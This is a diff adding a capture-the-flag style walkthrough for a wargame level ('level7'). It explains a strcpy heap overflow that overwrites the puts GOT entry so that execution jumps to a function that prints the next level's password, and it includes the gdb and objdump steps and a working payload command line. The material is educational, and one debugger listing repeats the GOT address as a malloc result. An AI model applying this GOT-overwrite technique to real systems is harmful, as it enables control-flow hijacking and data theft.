@@ -1,0 +1,131 @@
+# Exploiting the GOT to Redirect Execution
+
+This exercise involves exploiting the Global Offset Table (GOT) to redirect execution flow to a function of our choice.
+
+---
+
+#### 1. **Key Data Structures**
+
+- A custom structure (`struct_0`) with two fields:
+  - `field_0` (unsigned integer): Likely used to identify or flag the object.
+  - `field_4` (pointer to char): Points to dynamically allocated memory.
+
+#### 2. **Dynamic Memory Allocation**
+
+- Two instances of `struct_0` are allocated:
+  - `v1`: `field_0 = 1`, `field_4` points to dynamically allocated memory.
+  - `v0`: `field_0 = 2`, `field_4` points to dynamically allocated memory.
+  
+#### 3. **String Copy Operations**
+- **`strcpy(v1->field_4, argv[1])`**:
+  - Copies the first command-line argument into the memory pointed to by `v1->field_4`.
+- **`strcpy(v0->field_4, argv[2])`**:
+  - Copies the second command-line argument into the memory pointed to by `v0->field_4`.
+
+Both `strcpy` operations are unsafe and susceptible to buffer overflows if the input exceeds the allocated size.
+
+---
+
+#### **Vulnerability Analysis**
+
+1. **Global Offset Table (GOT)**:
+   - The GOT is a table used for dynamically linked functions. It stores addresses that point to library functions like `puts`, `printf`, or `system`.
+   - You can inspect the addresses for the GOT table using objdump with option `[-R|--dynamic-reloc]` Ex. `objdump -R level7 | grep puts`
+   - In this case, the GOT entry for `puts` (`puts@got.plt`) resides at `0x08049928`.
+
+2. **Procedure Linkage Table (PLT)**:
+   - The PLT serves as a trampoline for function calls. It uses the GOT to resolve addresses for library functions.
+
+3. **Attack**:
+   - The function `m()` is unused in the flow of the program.
+   - We can overwrite the GOT entry for `puts` to point to the `m()` function. When `puts()` is called, it will execute `m()` instead.
+
+4. **Key Functions and Variables**:
+   - **Global Variable `c`**: Stores the contents of the password file (`/home/user/level8/.pass`).
+   - **`puts` GOT Entry**: Target for redirection to `m()`.
+
+---
+
+#### **The Exploit**
+
+The payload works by:
+1. Overwriting `puts@got.plt` (`0x08049928`) with the address of `m()` (`0x080484f4`).
+2. Triggering `puts()` to call `m()`, which leaks the password.
+
+---
+
+#### **Exploit Steps**
+
+##### **1. Analyze Memory Allocations**
+Using a debugger (`gdb`):
+- Inspect memory allocated by `malloc()`:
+  ```
+  Malloc 1: 0x08048531 <+16>: call malloc@plt -> 0x08049928
+  Malloc 2: 0x0804854b <+42>: call malloc@plt -> 0x08049938
+  ```
+- GOT entry for `puts`:
+  ```
+  0x08049928 → Address of `puts@got.plt`.
+  ```
+
+##### **2. Inspect GOT and PLT**
+- GOT entry for `puts`:
+  ```
+  x/x 0x08049928
+  ```
+  Initially points to the resolver or the `puts` function.
+
+- Address of `m()`:
+  ```
+  objdump -d ./level7 | grep "<m>"
+  0x080484f4 <m>:
+  ```
+
+##### **3. Construct the Exploit**
+We need to:
+- Overwrite `puts@got.plt` (`0x08049928`) with the address of `m()` (`0x080484f4`).
+- Use `argv` inputs to craft the payload.
+
+**Payload**:
+1. First Argument (`argv[1]`):
+   ```
+   $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")')
+   ```
+   - Overflows into the memory of `v1->field_4`.
+   - `0x08049928` is the address of `puts@got.plt`.
+
+2. Second Argument (`argv[2]`):
+   ```
+   $(python -c 'print("\xf4\x84\x04\x08")')
+   ```
+   - Writes the address of `m()` (`0x080484f4`) to `puts@got.plt`.
+
+##### **4. Trigger the Exploit**
+Run the program with the crafted payload:
+```bash
+./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
+```
+
+##### **5. Observe Output**
+- When `puts()` is called after the overwrite, it will invoke `m()` instead.
+- `m()` will print the password stored in `c`.
+
+---
+
+#### **Key Exploit Components Explained**
+
+1. **`0x08049928`**: GOT entry for `puts`.
+   - Targeted for redirection.
+
+2. **`0x080484f4`**: Address of `m()`.
+   - The function we want to execute instead of `puts()`.
+
+3. **Payload Mechanics**:
+   - First argument (`argv[1]`): Writes to the GOT entry of `puts` using an overflow.
+   - Second argument (`argv[2]`): Provides the replacement address (`m()`).
+
+---
+
+#### **Conclusion**
+
+This exercise demonstrates the power of targeting the GOT for exploitation. By manipulating the GOT entry for `puts`, we successfully redirected execution flow to an unused function (`m()`), which exposed sensitive data (`/home/user/level8/.pass`). This type of exploit is a classic example of leveraging program mechanics (GOT/PLT) to bypass intended control flow.
